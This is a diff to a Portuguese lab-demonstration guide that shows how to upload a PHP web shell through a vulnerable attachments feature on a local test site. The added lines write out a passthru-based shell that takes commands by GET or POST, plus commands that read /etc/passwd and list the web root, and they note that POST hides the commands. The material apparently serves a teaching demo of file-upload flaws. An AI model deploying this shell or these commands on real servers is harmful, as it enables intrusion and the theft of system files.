@@ -242,19 +242,32 @@ rm -f "$jar"
 
 **Como demonstrar:**
 
-1. Login como **Ivan**.
-2. Crie no seu computador um arquivo `cmd.php` com:
+1. No terminal, na pasta do projeto, crie um PHP malicioso de laboratório (aceita comando por **GET ou POST**, redireciona stderr para a resposta — mais útil que um `echo shell_exec` só com GET):
 
-```php
-<?php echo shell_exec($_GET["c"]); ?>
+```bash
+cat > shell.php <<'EOF'
+<?php
+if (isset($_REQUEST['c'])) {
+    passthru($_REQUEST['c'] . ' 2>&1');
+}
+?>
+EOF
 ```
 
-3. Menu **Anexos** → escolha `cmd.php` → **Enviar** (mensagem de sucesso com `anexos/cmd.php`).
-4. No navegador abra: `http://localhost:8080/anexos/cmd.php?c=id`
-5. Mostre a saída com `uid=` / `www-data`.
-6. Após a demo, apague `site/anexos/cmd.php` no projeto se não quiser deixar a shell no disco.
+2. Login como **Ivan**.
+3. Menu **Anexos** → envie `shell.php` → confirme a mensagem com `anexos/shell.php`.
+4. **Navegador (comando na URL):** `http://localhost:8080/anexos/shell.php?c=id` — mostre `uid=` / `www-data`.
+5. **Mais malicioso (comando no POST, não aparece na barra de endereços):** leitura de arquivo do servidor, por exemplo:
 
-**O que a banca deve ver:** persistência — ponto de execução remota reutilizável no servidor.
+```bash
+curl -s -X POST --data-urlencode 'c=cat /etc/passwd' \
+  http://localhost:8080/anexos/shell.php | head
+```
+
+6. (Opcional) Listar o diretório do site: `?c=ls+-la+/var/www/html` ou POST com `c=ls -la /var/www/html`.
+7. Apague `shell.php` local e `site/anexos/shell.php` após a demo.
+
+**O que a banca deve ver:** persistência — web shell reutilizável; o atacante não precisa reexplorar Impressora a cada comando e pode esconder o payload no POST do upload + POST na shell.
 
 ### 7.5 Inclusão de arquivo local (LFI)
 
